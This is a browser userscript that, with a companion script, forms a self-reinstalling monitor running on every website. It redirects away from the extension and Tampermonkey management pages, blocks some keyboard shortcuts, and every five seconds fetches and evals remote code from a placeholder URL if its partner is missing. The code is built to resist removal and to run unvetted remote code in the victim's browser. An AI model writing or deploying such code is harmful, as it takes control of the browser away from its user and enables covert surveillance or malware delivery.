// ==UserScript==
// @name         Ultimate Monitor 1
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  Watches and enforces Ultimate Monitor 2
// @author       Miss
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';

    const monitoredScript = "Ultimate Monitor 2";
    const monitoredScriptURL = "https://your-ultimate-monitor-2-url";

    // Block Tampermonkey Dashboard
    if (location.href.includes('chrome-extension://') || location.href.includes('moz-extension://')) {
        alert("Access to Tampermonkey is restricted.");
        location.href = "about:blank";
    }

    // Block Browser Extensions Management
    if (location.href.includes('chrome://extensions') || location.href.includes('about:addons')) {
        alert("Access to extensions management is restricted.");
        location.href = "about:blank";
    }

    // Disable Common Shortcuts
    document.addEventListener('keydown', function(event) {
        if ((event.ctrlKey && event.shiftKey && event.key === 'A') || (event.key === 'Escape')) {
            alert("This action is restricted.");
            event.preventDefault();
        }
    });

    // Monitor and Reinstall Ultimate Monitor 2
    setInterval(() => {
        if (!GM_getValue("script2_active")) {
            alert(`${monitoredScript} is missing! Reinstalling...`);
            reinstallMonitoredScript();
        }
    }, 5000);

    function reinstallMonitoredScript() {
        GM_xmlhttpRequest({
            method: "GET",
            url: monitoredScriptURL,
            onload: function(response) {
                GM_setValue("script2_active", true);
                eval(response.responseText);
            }
        });
    }

    GM_setValue("script1_active", true); // Mark this script as active
})();
